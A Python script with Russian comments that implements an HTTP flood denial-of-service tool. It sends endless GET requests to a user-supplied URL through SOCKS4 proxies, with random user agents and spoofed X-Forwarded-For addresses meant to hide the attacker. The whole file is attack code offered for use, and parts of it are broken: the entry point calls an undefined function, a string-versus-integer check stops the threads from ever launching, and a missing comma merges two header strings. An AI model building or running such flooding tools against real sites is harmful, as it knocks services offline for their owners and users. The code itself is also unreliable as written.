# -*- coding: utf-8 -*-
import urllib.request
import sys
from scapy.all import *
import socket
import socks
import threading
import random
import time




def pizda():
    global threads
    global get_host
    global acceptall
    global connection
    global go
    global x
    global url
    global port
    global proxies
    global useragents
    global multiple
    global url2
    global urlport
    useragents = []
    multiple = int(input("Умножение [+] ► ")) # Умножение, значение можно менять
    threads = int(input("Потоки [+] ► "))
    url = input("Url[+] ► ")
    port = 80 
    proxies = open("socks4.txt","r").readlines()

    handle = open("useragents.txt","r")
    for x in handle:
        useragents.append(x)
    useragents = map(lambda s: s.strip(), useragents)
    useragents = list(useragents)
    print(useragents)




    try:
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
    except:
        print("Ошибка!")
        exit()

    try:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

    try:
        urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
    except:
        urlport = "80"


    get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
    acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ] 
    connection = "Connection: Keep-Alive\r\n" #
    x = 0 # для счета
    go = threading.Event()
    ddosi = 1
    if ddosi == "1":
        for x in range(threads):
            HttpsFlood(x+1).start() # запуск класса
            print ("Поток " + str(x) + " готов!")
        go.set() # Запуск потоков, как только они все будут готовы



class HttpsFlood(threading.Thread):
    def __init__(self,counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n" # выбор рандомного useragent-а
        accept = random.choice(acceptall) # выбор рандомного заголовка "Accept"
        randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For добавляем заголовок, который повысит нам анонимность
        request = get_host + useragent + accept + forward + connection + "\r\n" # создаем конечный запрос
        current = x # текущий поток
        if current < len(proxies): # если  поток может  связаться с прокси, этот прокси используется
            proxy = proxies[current].strip().split(':')
        else:  # в противном случае выбирается другое прокси
            proxy = random.choice(proxies).strip().split(":")
        go.wait() # ожидание, пока все прокси будут готовы
        while True: # бесконечный цикл
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # создаем сокет
                s.connect((str(proxy[0]), int(proxy[1]))) # конектимся к прокси
                s.send(str.encode(request)) # кодируем запрос в байты
                print ("Запрос отправлен с " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) # вывод req + counter
                try: # отправлять другие запросы в этом же потоке
                    for y in range(multiple): # коэффициент умножения
                        s.send(str.encode(request)) # кодируем запрос в байты
                except: # если что-то пойдет не так, сокет закроется, и цикл снова запустится
                    s.close()
            except:
                s.close() # если что-то пойдет не так, закрыть поток и начать заного

if __name__ == '__main__':
    checkURL()